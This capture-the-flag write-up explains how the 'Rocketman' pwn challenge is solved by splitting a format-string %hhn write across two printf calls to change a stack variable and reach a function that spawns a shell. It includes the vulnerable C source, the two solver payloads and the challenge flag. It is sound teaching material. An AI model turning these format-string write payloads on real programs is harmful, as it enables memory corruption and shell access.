---
title: "Rocketman"
area: format-strings
role: author
event: friendly-2026
published: 2026-09-29
summary: "Full Clip's sibling: a smaller buffer and two printf calls split the same %n write to a loop counter across two payloads."
techniques: ["format string", "%n write", "multi-stage write"]
difficulty: medium
arch: amd64
flag: "Securinets{r0ck3tm4n_n33d3d_tw0_sh0ts_t0_l4nd}"
---

> Category: **pwn** — Tag: **format-string**
> Flag: `Securinets{r0ck3tm4n_n33d3d_tw0_sh0ts_t0_l4nd}`

The sibling of [Full Clip](../cheat_code_FULLCLIP) — same bug, same win
condition, but this time you only get a *small* buffer and *two* separate
`read`+`printf` shots instead of one, exactly as the flavor text says:
*"only unlocks after two careful reloads — line up both shots."*

## 1. The program

```c
void win(){ system("/bin/sh"); }

void vuln(){
    char * p;
    char buf[0x20];               // smaller buffer than Full Clip's 0x50!
    p = buf;
    char ** p2 = &p;
    long long i = 0x67;           // needs to become 0xc0, same as Full Clip

    for (int j = 0; j <= 1; j++){
        read(0, buf, 0x20);
        printf(buf);               // <-- format string bug, run TWICE
    }
    if (i == 0xc0) win();
}
```

The key structural difference from Full Clip: `buf` is only `0x20` (32)
bytes here, versus `0x50` (80) there, and the `read`+`printf` pair is
wrapped in a `for` loop that runs **exactly twice**. A smaller buffer means
less room for both "padding to hit the exact target value" specifiers *and*
a self-planted pointer address in a single shot — so the exploit has to be
split across the two available `printf` calls instead of doing everything
in one, like Full Clip did.

## 2. Two shots, two writes

`solver.py`'s comment states this directly:

```python
payload = "%c%c%c%c%c%c%50c%hhn"
# same FULLCLIP idea but we have 2 overwrites we could use %offset$hhn
p.sendline(payload)

payload = "%192c%7$hhn"
p.sendline(payload)
```

- **First `read`/`printf` (shot 1):** `"%c%c%c%c%c%c%50c%hhn"` — this is
  literally the *first half* of Full Clip's single payload: six plain
  `%c`s walk past the initial phantom register arguments, `%50c` pads the
  running character count, and a plain (non-positional) `%hhn` performs the
  first single-byte write. Because the buffer is smaller here, there isn't
  room in one `read()` to also stage a second target address and a second
  write directive — so this shot does as much setup/writing as fits, and
  stops.
- **Second `read`/`printf` (shot 2):** `"%192c%7$hhn"` — a *fresh* format
  string sent on the *next* iteration of the loop. Because `buf` gets
  overwritten completely by the new `read()`, this is a clean slate: pad
  the character count up to `192` (`0xc0` in decimal) directly, then use a
  **positional** `%7$hhn` to write that single byte into `i`'s address —
  argument `7` again referring to a stack slot the author confirmed (via
  GDB) points at `i`.

Splitting the exploit across two writes instead of one is only possible
*because* the vulnerable code calls `printf` twice on the same stack frame
— each call is independent, so the second one can simply finish the job
the first one didn't have room to complete, using a clean, simpler payload.

## 3. Running it

```python
payload = "%c%c%c%c%c%c%50c%hhn"
p.sendline(payload)

payload = "%192c%7$hhn"
p.sendline(payload)

p.interactive()
```

By the time the loop exits, `i` should equal `0xc0`, so `win()` fires and
drops a shell via `system("/bin/sh")`.

## 4. Full Clip vs. Rocketman, side by side

| Aspect | Full Clip | Rocketman |
|---|---|---|
| Buffer size | `0x50` | `0x20` (smaller) |
| `read`+`printf` calls | 1 | 2 (looped) |
| Payload(s) | one combined string | two separate strings |
| Core `%n` trick | identical (`%c` padding + `%hhn`, self-planted stack pointer) | identical |

Same underlying vulnerability class, same target value (`0xc0`), same
"self-contained" format-string write technique — the only real difference
is how the smaller buffer forces the exploit to be spread over two
requests instead of squeezed into one.

## 5. Lesson

A format-string arbitrary-write doesn't have to happen in a single call.
If the vulnerable `printf` runs more than once against the *same* stack
frame (as in a loop), you can stage a multi-step write across separate
requests — useful when buffer size limits how much you can pack into any
one payload.
